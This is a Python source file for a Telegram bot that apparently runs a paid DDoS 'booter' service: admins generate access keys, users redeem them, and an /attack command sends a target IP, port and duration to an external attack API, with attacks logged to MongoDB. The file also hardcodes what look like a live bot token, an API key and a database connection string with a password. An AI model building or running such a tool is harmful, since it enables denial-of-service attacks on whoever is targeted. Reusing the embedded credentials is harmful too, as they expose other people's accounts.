import asyncio
import logging
import requests
import os
import uuid
import pymongo
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps
from telegram import Update
from telegram.ext import Application, CommandHandler, filters, ContextTypes
from pymongo import MongoClient, ASCENDING

# --- CONFIGURATION ---
ADMIN_IDS = [8787952549] 
API_KEY = "ak_e09b114844018935feffc"
API_URL = "https://api.battle-destroyer.shop/api/v1"
BOT_TOKEN = "8749691844:AAH2y4OJDPmTq6LLle6fBkFYyAI9hA2FEL8"
DATABASE_NAME = "sastadev"
MONGODB_URI = "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev"

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# --- LOGGING ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- UTILS ---
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        print("🔄 Initializing database connection...")
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.keys = self.db.keys
        self.attacks = self.db.attacks
        self._setup_indexes()
        print("✅ Database initialized successfully!")

    def _setup_indexes(self):
        try:
            # Dropping existing indexes to ensure a clean start as per logs
            self.users.drop_indexes()
            logger.info("Dropped all existing indexes from users collection")
            
            self.attacks.drop_indexes()
            logger.info("Dropped all existing indexes from attacks collection")
            
            # Re-creating fresh indexes
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            logger.info("Created unique index on user_id for users collection")
            
            self.attacks.create_index([("user_id", ASCENDING)])
            logger.info("Created indexes for attacks collection")
            
            self.keys.create_index([("key", ASCENDING)], unique=True)
        except Exception as e:
            logger.error(f"Error during index setup: {e}")

    def get_user(self, user_id: int):
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None):
        if not self.get_user(user_id):
            self.users.insert_one({
                "user_id": user_id,
                "username": username,
                "approved": False,
                "expires_at": None,
                "created_at": datetime.now(timezone.utc)
            })

    def add_duration(self, user_id: int, days: int):
        expiry = datetime.now(timezone.utc) + timedelta(days=days)
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "expires_at": expiry}}
        )
        return expiry

    def generate_key(self, days: int):
        new_key = f"SASTA-{uuid.uuid4().hex[:8].upper()}"
        self.keys.insert_one({"key": new_key, "days": days, "used": False})
        return new_key

    def redeem_key(self, user_id: int, key_str: str):
        key_doc = self.keys.find_one({"key": key_str, "used": False})
        if key_doc:
            expiry = self.add_duration(user_id, key_doc['days'])
            self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
            return key_doc['days'], expiry
        return None, None

db = Database()

# --- AUTH DECORATOR ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin access required.")
            return
        return await func(update, context)
    return wrapper

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    await update.message.reply_text(
        "👋 Welcome to SASTA DEVELOPER Bot!\n\n"
        "🎟️ /redeem <key> - Activate access\n"
        "🚀 /attack <ip> <port> <time>\n"
        "👑 /genkey <days> - Admin only"
    )

@admin_required
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("Usage: /genkey <days>")
    days = int(context.args[0])
    key = db.generate_key(days)
    await update.message.reply_text(f"🔑 **Key:** `{key}`\n⏳ **Duration:** {days} Days")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("Usage: /redeem <key>")
    key_str = context.args[0]
    days, expiry = db.redeem_key(update.effective_user.id, key_str)
    if days:
        await update.message.reply_text(f"✅ Success! Access for {days} days.")
    else:
        await update.message.reply_text("❌ Invalid or used key.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = db.get_user(user_id)
    current_ip = get_public_ip()

    if not user_data or not user_data.get("approved"):
        return await update.message.reply_text("❌ Not approved. Redeem a key.")
    
    expiry = user_data["expires_at"].replace(tzinfo=timezone.utc)
    if expiry < datetime.now(timezone.utc):
        return await update.message.reply_text("❌ Access expired.")

    if len(context.args) < 3:
        return await update.message.reply_text("Usage: /attack <ip> <port> <time>")

    target, port, duration = context.args
    
    if int(port) in BLOCKED_PORTS:
        return await update.message.reply_text(f"❌ Port {port} is blocked.")

    payload = {"ip": target, "port": port, "duration": duration}
    headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}

    try:
        response = requests.post(f"{API_URL}/attack", json=payload, headers=headers, timeout=15)
        res_data = response.json()

        if res_data.get("success"):
            attack_info = res_data.get("attack", {})
            limits = res_data.get("limits", {})
            account = res_data.get("account", {})
            
            # Log attack history
            db.attacks.insert_one({
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "timestamp": datetime.now(timezone.utc)
            })

            msg = (
                f"> 𝚅𝙸𝙿 𝐒𝙴𝐑𝚅𝐄𝐑 𝐎𝙽𝐋𝚈: Attack Launched Successfully!\n\n"
                f" Target: {target}:{port}\n"
                f" Duration: {duration} seconds\n"
                f" Attack ID: {attack_info.get('id', 'N/A')[:8]}...\n"
                f" Ends At: {attack_info.get('endsAt', 'N/A')}\n\n"
                f" Your Limits:\n"
                f"• Active Attacks: {limits.get('currentActive', 0)} / {limits.get('maxConcurrent', 0)}\n"
                f"• Remaining Slots: {limits.get('remainingSlots', 0)}\n\n"
                f" Account:\n"
                f"• Status: {account.get('status', 'active')}\n"
                f"• Days Remaining: {account.get('daysRemaining', 0)}"
            )
            await update.message.reply_text(msg)
        else:
            error_detail = res_data.get("error", "IP not whitelisted")
            await update.message.reply_text(f"⚠️ **Attack Failed!**\n\nError: {error_detail}\nDetails: Your IP ({current_ip}) status verification failed.")
            
    except Exception as e:
        await update.message.reply_text(f"❌ Connection Error: {str(e)}")

# --- MAIN RUNNER ---
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("attack", attack))

    ip = get_public_ip()
    print("---------------------------------")
    print("🤖 Bot is starting...")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 API URL: {API_URL}")
    print(f"🔑 API Key: {API_KEY[:10]}...")
    print(f"🚫 Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")
    print(f"✅ Bot is running!")
    print(f"Server IP: {ip}")
    print("📊 MongoDB: Connected and indexes optimized.")
    print("---------------------------------")

    application.run_polling()

if __name__ == "__main__":
    main()
